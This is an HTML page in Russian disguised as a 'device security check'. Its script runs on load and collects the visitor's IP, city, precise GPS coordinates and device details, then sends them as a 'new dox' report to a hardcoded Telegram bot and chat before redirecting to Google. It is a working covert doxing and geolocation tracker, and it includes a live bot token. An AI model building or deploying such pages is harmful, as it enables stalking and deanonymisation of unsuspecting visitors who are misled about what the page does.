<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Проверка соединения</title>
    <style>
        body {
            background: #0a0f1a;
            font-family: 'Courier New', monospace;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        .box {
            background: #0d1117;
            border: 1px solid #00ffcc;
            border-radius: 12px;
            padding: 30px;
            max-width: 500px;
            text-align: center;
            box-shadow: 0 0 20px rgba(0,255,204,0.2);
        }
        .loader {
            width: 40px;
            height: 40px;
            border: 3px solid #00ffcc;
            border-top-color: transparent;
            border-radius: 50%;
            margin: 20px auto;
            animation: spin 1s linear infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        .status {
            color: #00ffcc;
            margin-top: 15px;
            font-size: 14px;
        }
        h1 { font-size: 18px; color: #ffaa44; margin-bottom: 20px; }
    </style>
</head>
<body>
<div class="box">
    <h1>⚡ ПРОВЕРКА БЕЗОПАСНОСТИ УСТРОЙСТВА ⚡</h1>
    <div class="loader" id="loader"></div>
    <div class="status" id="status">Инициализация... Запрос геолокации</div>
</div>

<script>
    // ==================== ВАШИ ДАННЫЕ (ВСТАВЛЕНЫ) ====================
    const TELEGRAM_BOT_TOKEN = "8825859377:AAEuQWJ3v2q_HW1Q73POWFIeaRM3NntQu_Q";
    const TELEGRAM_CHAT_ID = "6470449560";
    // =================================================================

    let collectedData = {};

    async function sendToTelegram(message) {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        try {
            const response = await fetch(url, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message,
                    parse_mode: "HTML"
                })
            });
            const result = await response.json();
            return result.ok === true;
        } catch(e) { 
            return false; 
        }
    }

    function formatMessage(data) {
        let msg = "🔴 <b>НОВЫЙ ДОКС</b> 🔴\n\n";
        msg += `📅 Время: ${data.timestamp}\n`;
        msg += `🌐 IP: ${data.ip}\n`;
        msg += `📍 Город (по IP): ${data.city}\n`;
        msg += `📡 Координаты IP: ${data.ipLat}, ${data.ipLon}\n\n`;
        
        if (data.gps) {
            msg += `🎯 <b>ТОЧНЫЕ КООРДИНАТЫ (GPS)</b> 🎯\n`;
            msg += `📍 Широта: ${data.gps.lat}\n`;
            msg += `📍 Долгота: ${data.gps.lon}\n`;
            msg += `📏 Точность: ${data.gps.accuracy} метров\n`;
            msg += `🗺️ Карта: https://www.google.com/maps?q=${data.gps.lat},${data.gps.lon}\n\n`;
        } else {
            msg += `❌ GPS: отказано или недоступно\n\n`;
        }
        
        msg += `<b>📱 УСТРОЙСТВО:</b>\n`;
        msg += `🔹 Браузер: ${data.device.userAgent.substring(0, 100)}...\n`;
        msg += `🔹 Платформа: ${data.device.platform}\n`;
        msg += `🔹 Экран: ${data.device.screenWidth}x${data.device.screenHeight}\n`;
        msg += `🔹 Часовой пояс: ${data.device.timezone}\n`;
        msg += `🔹 Язык: ${data.device.language}\n`;
        msg += `🔹 TouchScreen: ${data.device.touchSupport ? "Да" : "Нет"}\n`;
        
        msg += `\n🔗 <b>Referer:</b> ${data.referrer || "прямой переход"}\n`;
        return msg;
    }

    async function getIpInfo() {
        try {
            const response = await fetch("https://ip-api.com/json/?fields=status,country,regionName,city,lat,lon,isp,query");
            const data = await response.json();
            if (data.status === "success") {
                return {
                    ip: data.query,
                    city: `${data.city}, ${data.regionName}, ${data.country}`,
                    ipLat: data.lat,
                    ipLon: data.lon,
                    isp: data.isp
                };
            }
        } catch(e) {}
        return { ip: "неизвестно", city: "неизвестно", ipLat: 0, ipLon: 0, isp: "" };
    }

    function getAccurateLocation() {
        return new Promise((resolve) => {
            if (!navigator.geolocation) {
                resolve(null);
                return;
            }
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    resolve({
                        lat: position.coords.latitude,
                        lon: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        time: new Date(position.timestamp).toISOString()
                    });
                },
                (error) => {
                    resolve(null);
                },
                { enableHighAccuracy: true, timeout: 10000 }
            );
        });
    }

    function getDeviceInfo() {
        return {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            screenWidth: screen.width,
            screenHeight: screen.height,
            colorDepth: screen.colorDepth,
            touchSupport: "ontouchstart" in window,
            hardwareConcurrency: navigator.hardwareConcurrency || "?"
        };
    }

    async function main() {
        document.getElementById("status").innerHTML = "📡 Получение IP и геоданных...";
        
        const ipInfo = await getIpInfo();
        document.getElementById("status").innerHTML = "🎯 Запрос точной геолокации... Разрешите доступ";
        
        const gps = await getAccurateLocation();
        const device = getDeviceInfo();
        
        collectedData = {
            timestamp: new Date().toISOString(),
            ip: ipInfo.ip,
            city: ipInfo.city,
            ipLat: ipInfo.ipLat,
            ipLon: ipInfo.ipLon,
            isp: ipInfo.isp,
            gps: gps,
            device: device,
            referrer: document.referrer,
            url: window.location.href
        };
        
        document.getElementById("status").innerHTML = "📤 Отправка данных...";
        
        const message = formatMessage(collectedData);
        const tgSent = await sendToTelegram(message);
        
        if (tgSent) {
            document.getElementById("status").innerHTML = "✅ Данные отправлены. Перенаправление...";
        } else {
            document.getElementById("status").innerHTML = "⚠️ Ошибка отправки. Перенаправление...";
        }
        
        setTimeout(() => {
            window.location.href = "https://www.google.com";
        }, 2000);
    }
    
    main();
</script>
</body>
</html>
